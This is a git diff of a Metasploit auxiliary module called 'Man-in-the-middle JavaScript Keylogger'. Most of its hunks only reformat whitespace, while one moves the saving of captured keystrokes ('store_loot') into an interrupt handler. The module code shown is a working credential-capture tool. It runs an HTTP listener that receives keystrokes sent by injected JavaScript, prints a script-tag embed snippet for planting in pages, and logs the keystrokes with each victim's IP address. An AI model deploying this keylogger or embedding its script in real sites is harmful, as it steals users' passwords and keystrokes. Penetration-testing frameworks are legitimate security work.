@@ -15,8 +15,8 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Man-in-the-middle JavaScript Keylogger',
 			'Description'    => %q{
-					This modules runs a HTTP Server to serve as a remote keylog listener
-					to capture web page keystrokes.
+				This modules runs a HTTP Server to serve as a remote keylog listener
+				to capture web page keystrokes.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => ['Marcus J. Carey <mjc[at]threatagent.com>'],
@@ -41,12 +41,12 @@ class Metasploit3 < Msf::Auxiliary
 </head>
 <body bgcolor="white">
 <br><br>
-<div align="center"> 
+<div align="center">
 <h1>Metasploit<br>Javascript Keylogger Demo</h1>
 <form method=\"POST\" name=\"logonf\" action=\"#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/metasploit\">
 <p><font color="red"><i>This form submits data to the Metasploit listener <br>at #{datastore['SRVHOST']}:#{datastore['SRVPORT']} for demonstration purposes.</i></font>
 <br><br>
-<table border="0" cellspacing="0" cellpadding="0"> 
+<table border="0" cellspacing="0" cellpadding="0">
 <tr><td>Username:</td> <td><input name="userf" size="20"></td> </tr>
 <tr><td>Password:</td> <td><input type="password" name="passwordf" size="20"></td> </tr>
 </table>
@@ -180,13 +180,6 @@ EOS
 		return ico
 	end
 
-	# This handles reporting to the database
-	def cleanup
-		super
-		path = store_loot("javascript.keystrokes", "text/plain", @host, @loot)
-		print_status("Stored loot at #{path}")
-	end
-
 	def current_time
 		return Time.new.utc.strftime("[%d/%b/%Y:%H:%M:%S %Z]")
 	end
@@ -206,15 +199,15 @@ EOS
 			content = keylogger
 			send_response(cli, content, {'Content-Type'=> content_type})
 			request_timestamp(cli,request)
-		
+
 		# JavaScript XML HTTP GET Request is used for sending the keystrokes over network.
 		elsif request.uri =~ /#{@random_text}/
 			content_type = "text/plain"
-				send_response(cli, @random_text, {'Content-Type'=> content_type})
+			send_response(cli, @random_text, {'Content-Type'=> content_type})
 			log = request.uri.split("&")[1]
 			hex_to_s(log)
 			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\r\n"
-			if log.length > 1 
+			if log.length > 1
 				print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@ascii_log}")
 			end
 
@@ -261,7 +254,7 @@ EOS
 			Started at #{current_time}
 			=====================================
 
-		}
+}
 		logo = logo.gsub("\t\t\t","")
 
 		@loot << logo
@@ -282,10 +275,16 @@ EOS
 		end
 
 		# Prints HTML Embed Code
-		print_status(" Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")
+		print_status("Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")
+		print_status("Starting keylogger.  Please press [CTRl]+[C] if you wish to terminate.")
 
 		# Starts Web Server
-		exploit
+		begin
+			exploit
+		rescue Interrupt
+			path = store_loot("javascript.keystrokes", "text/plain", @host, @loot)
+			print_status("Stored loot at #{path}")
+		end
 	end
 end
 
